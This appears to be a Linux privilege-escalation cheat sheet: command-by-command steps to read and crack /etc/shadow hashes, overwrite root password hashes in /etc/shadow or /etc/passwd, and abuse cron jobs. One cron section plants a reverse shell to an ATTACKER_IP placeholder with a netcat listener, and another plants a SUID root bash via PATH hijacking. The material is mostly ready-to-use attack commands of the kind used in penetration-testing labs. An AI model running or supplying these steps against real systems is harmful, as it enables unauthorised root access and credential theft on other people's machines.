Readable /etc/shadow:
  ls -l /etc/shadow
  cat /etc/shadow
                Each line of the file represents a user. A user's password hash (if they have one)
                can be found between the first and second colons (:) of each line
  john --wordlist=$ROCKYOU hash.txt
  su root

Writable /etc/shadow:
  ls -l /etc/shadow
  mkpasswd -m sha-512 newpasswordhere
                Generate new password hash with a password of your choice
  vim /etc/shadow
                Edit the /etc/shadow file and replace the original root user's
                epassword hash with the one you just generated
  su root

Writable /etc/passwd:
  ls -l /etc/passwd
                Some versions of Linux will still allow password hashes to be stored there
  openssl passwd newpasswordhere
                Generate a new password hash with a password of your choice
  vim /etc/passwd
                Edit the /etc/passwd file and place the generated password hash between the first 
                and second colon (:) of the root user's row (replacing the "x")
                Alternatively, copy the root user's row and append it to the bottom of the file, 
                changing the first instance of the word "root" to "newroot" and placing the generated 
                password hash between the first and second colon (replacing the "x").
  su root

Cron Jobs - File Permissions:
  cat /etc/crontab
                View the contents of the system-wide crontab.
  locate script.sh
                Locate the full path of the script
  ls -l /usr/local/bin/script.sh
                Check if that the file is world-writable
  echo '#!/bin/bash
  bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' > /usr/loca/bin/script.sh
                Replace the contents of the script.sh file with the following after changing the IP address
  nc -nvlp 4444
                Set up a netcat listener on attacker machine and wait for the cron job to run

Cron Jobs - PATH Environment Variable:
  cat /etc/crontab
                View the contents of the system-wide crontab, let's say the PATH
                variable starts with /home/user
  echo '#!/bin/bash
  cp /bin/bash /tmp/rootbash
  chmod +xs /tmp/rootbash' > overwrite.sh
                Create a file called overwrite.sh in your home directory
  chmod +x /home/user/overwrite.sh
  /tmp/rootbash -p
                Wait for the cron job to run and Run the /tmp/rootbash command with
                -p to gain a shell running with root privileges
